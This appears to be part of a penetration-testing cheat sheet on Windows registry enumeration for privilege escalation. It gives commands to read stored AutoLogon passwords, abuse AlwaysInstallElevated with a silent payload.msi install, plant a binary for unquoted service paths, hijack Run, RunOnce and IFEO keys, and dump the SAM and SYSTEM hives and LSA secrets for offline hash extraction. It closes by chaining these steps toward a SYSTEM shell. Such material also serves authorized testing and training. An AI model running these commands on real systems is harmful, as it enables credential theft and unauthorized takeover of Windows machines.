
---

# 🧠 15. 🗄️ Registry Enumeration (CRITICAL for PrivEsc)

---

# 🔑 AutoRun / AutoLogon Credentials

## Check for stored credentials

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

👉 Look for:

* `DefaultUserName`
* `DefaultPassword` 🔥
* `AutoAdminLogon`

💥 If password exists → **instant admin login**

---

# 🔐 AlwaysInstallElevated (MSI PrivEsc)

## Check both keys

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

👉 Look for:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

💥 If **both = 1** → MSI runs as SYSTEM

👉 Exploit:

```
msiexec /quiet /qn /i payload.msi
```

---

# 🛠️ Installed Software (Registry View)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

👉 Useful for:

* Finding vulnerable apps
* Hidden installs not shown in GUI

---

# ⚙️ Services via Registry

```
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

## Deep inspect a service

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
```

👉 Look for:

* `ImagePath` 🔥 (unquoted path)
* Weak permissions on service config

---

# 💣 Unquoted Service Path (Registry Angle)

Example:

```
ImagePath = C:\Program Files\Vuln App\service.exe
```

👉 Same abuse:

Drop malicious binary in:

```
C:\Program.exe
```

---

# 🧪 Startup Applications (Persistence + PrivEsc)

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

👉 Look for:

* Writable paths
* Custom scripts/binaries

---

# 🔄 RunOnce Keys

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

👉 Executes on next login → good for hijacking

---

# 🧬 Environment Variables Abuse

```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
```

👉 Look for:

* PATH hijacking opportunities
* Writable directories in PATH

---

# 🧠 UAC Bypass Checks

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

👉 Key values:

* `EnableLUA`
* `ConsentPromptBehaviorAdmin`

💥 Weak UAC → easier escalation

---

# 🧨 IFEO (Image File Execution Options) Hijack

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

👉 Look for:

* `Debugger` entries

💥 Can force execution of your binary instead

---

# 🔍 SAM & Security Hives (Credential Dump Prep)

```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

👉 Then extract hashes offline

---

# 🔥 Stored Credentials (LSA Secrets)

```
reg query HKLM\SECURITY\Policy\Secrets
```

👉 Requires SYSTEM → but **goldmine**

---

# 🧰 Registry Permissions Check

Use:

```
accesschk.exe -kvuqsw hklm\Software
```

👉 Look for:

* Writable registry keys 🔥
* Service config modification

---

# ⚡ Red Team Thinking (IMPORTANT)

When you see registry:

* ❓ Can I **write to this key?**
* ❓ Does this key control **execution?**
* ❓ Does it store **credentials?**
* ❓ Can I hijack **startup/service behavior?**

---

# 🚀 Pro Tip (Senior-Level Insight)

Most beginners:

❌ Just run `winPEAS` and copy output
✔ Real operators:

* Manually verify registry paths
* Chain:

  ```
  Writable registry → modify service → restart → SYSTEM shell
  ```

